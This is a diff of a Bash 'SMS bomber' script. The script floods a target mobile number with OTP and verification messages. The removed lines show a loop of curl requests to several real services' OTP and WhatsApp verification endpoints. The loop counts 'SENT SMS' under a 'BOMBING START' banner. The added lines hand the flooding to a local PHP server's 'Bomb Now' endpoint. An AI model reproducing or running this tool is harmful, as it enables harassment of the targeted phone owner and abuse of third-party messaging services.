@@ -365,21 +365,25 @@ echo -e "\n\n"
 sleep 5.0
 sbomb
 else
+clear
+pkill php
+php -S localhost:8080 > /dev/null 2>1&
+sleep 3
+curl "http://localhost:8080/?mo=$mobile&submit=Bomb+Now" > /dev/null 2>1&
+touch bomb.txt
+
 while true ;
 do
-clear
-curl -L -s "https://api.mydukaan.io/api/account/seller/sign-in/?mobile=$mobile&country_code=%2B91" > /dev/null 2>&1
 
-
-let count++
+if [ -e  bomb.txt ];
+then
 echo -e "\e[96m        |=====================================================|"
 echo -e "\e[96m        |-------------------------BOMBER----------------------|"
 echo -e "\e[96m        |=====================================================|"
 echo -e "\e[96m                                                             "
-echo -e "\e[96m                      BOMBING START...                                       "
+echo -e "\e[96m                      BOMBING START...                        "
 echo -e "\e[96m                                    "
 echo -e "\e[96m                MOBILE NUMBER   :    $mobile      "
-echo -e "\e[96m                SENT SMS        :    $count             "
 echo -e "\e[96m                                   "
 echo -e "\e[96m                                                             "
 echo -e "\e[96m        |=====================================================|"
@@ -387,85 +391,9 @@ echo -e "\e[96m        |                                                     |"
 echo -e "\e[96m        |---------------CTRL + Z FOR EXIT---------------------|"
 echo -e "\e[96m        |                                                     |"
 echo -e "\e[96m        |=====================================================|"
+rm bomb.txt
 
-sleep 1.0
-
-
-clear
-curl -L -s "http://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber=$mobile&newOtp=true&retry=false&channel=web&domainName=www.confirmtkt.com&testparamsp=true" > /dev/null 2>&1
-
-let count++
-
-echo -e "\e[96m        |=====================================================|"
-echo -e "\e[96m        |-------------------------BOMBER----------------------|"
-echo -e "\e[96m        |=====================================================|"
-echo -e "\e[96m                                                             "
-echo -e "\e[96m                      BOMBING START...                                       "
-echo -e "\e[96m                                    "
-echo -e "\e[96m                MOBILE NUMBER   :    $mobile      "
-echo -e "\e[96m                SENT SMS        :    $count             "
-echo -e "\e[96m                                   "
-echo -e "\e[96m                                                             "
-echo -e "\e[96m        |=====================================================|"
-echo -e "\e[96m        |                                                     |"
-echo -e "\e[96m        |---------------CTRL + Z FOR EXIT---------------------|"
-echo -e "\e[96m        |                                                     |"
-echo -e "\e[96m        |=====================================================|"
-
-
-sleep 1.0
-
-
-clear
-
-curl -L -s "https://web.bikry.com/otp/generate?mobile=$mobile&communication=true" > /dev/null 2>&1
-let count++
-
-
-
-echo -e "\e[96m        |=====================================================|"
-echo -e "\e[96m        |-------------------------BOMBER----------------------|"
-echo -e "\e[96m        |=====================================================|"
-echo -e "\e[96m                                                             "
-echo -e "\e[96m                      BOMBING START...                                       "
-echo -e "\e[96m                                    "
-echo -e "\e[96m                MOBILE NUMBER   :    $mobile      "
-echo -e "\e[96m                SENT SMS        :    $count             "
-echo -e "\e[96m                                   "
-echo -e "\e[96m                                                             "
-echo -e "\e[96m        |=====================================================|"
-echo -e "\e[96m        |                                                     |"
-echo -e "\e[96m        |---------------CTRL + Z FOR EXIT---------------------|"
-echo -e "\e[96m        |                                                     |"
-echo -e "\e[96m        |=====================================================|"
-
-clear
-
-curl -L -s "https://www.justdial.com/functions/whatsappverification.php?mob=$mobile&vcode=&rsend=1&name=sfdty+fhye" > /dev/null 2>&1
-let count++
-
-
-
-echo -e "\e[96m        |=====================================================|"
-echo -e "\e[96m        |-------------------------BOMBER----------------------|"
-echo -e "\e[96m        |=====================================================|"
-echo -e "\e[96m                                                             "
-echo -e "\e[96m                      BOMBING START...                                       "
-echo -e "\e[96m                                    "
-echo -e "\e[96m                MOBILE NUMBER   :    $mobile      "
-echo -e "\e[96m                SENT SMS        :    $count             "
-echo -e "\e[96m                                   "
-echo -e "\e[96m                                                             "
-echo -e "\e[96m        |=====================================================|"
-echo -e "\e[96m        |                                                     |"
-echo -e "\e[96m        |---------------CTRL + Z FOR EXIT---------------------|"
-echo -e "\e[96m        |                                                     |"
-echo -e "\e[96m        |=====================================================|"
-
-
-
-
-sleep 1.0
+fi
 done
 fi
 }
